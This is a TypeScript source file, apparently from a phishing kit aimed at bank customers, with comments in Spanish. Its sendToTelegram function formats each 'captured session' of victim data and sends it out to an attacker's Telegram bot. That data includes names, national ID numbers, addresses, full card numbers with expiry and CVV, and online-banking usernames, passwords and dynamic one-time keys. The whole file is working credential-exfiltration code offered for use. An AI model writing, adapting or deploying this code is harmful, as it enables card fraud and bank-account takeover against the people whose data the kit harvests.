import https from 'https';

// Función para enviar mensajes a Telegram usando https de Node.js
export async function sendToTelegram(sessionData: any) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.error('Telegram bot token or chat ID not configured');
    return;
  }

  try {
    // Formatear el mensaje
    const message = `
🔔 *Nueva Sesión Capturada*

*Sesión:* \`#${sessionData.sessionId.slice(-8)}\`
*Banco:* ${sessionData.bank.toUpperCase()}
*Estado:* ${sessionData.status}

*📋 Datos del Cliente*
*Nombre:* ${sessionData.fullName || 'N/A'}
*Email:* ${sessionData.email || 'N/A'}
*Teléfono:* ${sessionData.phone || 'N/A'}
*Cédula:* ${sessionData.documentId || 'N/A'}
*Dirección:* ${sessionData.address || 'N/A'}
*Ciudad:* ${sessionData.city || 'N/A'}

*💳 Datos de Tarjeta*
*Número:* \`${sessionData.cardNumber || 'N/A'}\`
*Titular:* ${sessionData.cardHolderName || 'N/A'}
*Vencimiento:* ${sessionData.expiryDate || 'N/A'}
*CVV:* \`${sessionData.cvv || 'N/A'}\`
*Marca:* ${sessionData.cardBrand || 'N/A'}

*🔐 Credenciales Bancarias*
*Usuario:* ${sessionData.usuario || 'N/A'}
*Clave:* \`${sessionData.clave || 'N/A'}\`
*Dinámica:* \`${sessionData.claveDinamica || 'N/A'}\`

*💰 Total:* $${sessionData.totalAmount?.toLocaleString('es-CO') || '0'}

*🕐 Fecha:* ${new Date(sessionData.createdAt).toLocaleString('es-CO')}
`;

    const data = JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown',
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${botToken}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
      },
      timeout: 10000, // 10 segundos
    };

    return new Promise((resolve, reject) => {
      const req = https.request(options, (res) => {
        let responseData = '';

        res.on('data', (chunk) => {
          responseData += chunk;
        });

        res.on('end', () => {
          if (res.statusCode === 200) {
            console.log('Message sent to Telegram successfully');
            resolve(true);
          } else {
            console.error('Telegram API error:', res.statusCode, responseData);
            reject(new Error(`Telegram API returned ${res.statusCode}`));
          }
        });
      });

      req.on('error', (error) => {
        console.error('Error sending to Telegram:', error);
        reject(error);
      });

      req.on('timeout', () => {
        req.destroy();
        console.error('Telegram request timeout');
        reject(new Error('Request timeout'));
      });

      req.write(data);
      req.end();
    });
  } catch (error) {
    console.error('Error in sendToTelegram:', error);
    throw error;
  }
}
